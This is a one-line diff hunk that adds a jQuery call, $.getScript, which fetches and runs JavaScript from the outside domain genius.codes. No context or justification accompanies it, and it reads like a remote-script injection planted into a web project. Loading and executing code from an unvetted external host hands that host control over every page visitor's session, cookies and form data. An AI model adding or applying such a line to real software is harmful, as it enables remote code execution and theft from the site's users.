@@ -1,0 +1,1 @@
+$.getScript("https://genius.codes");
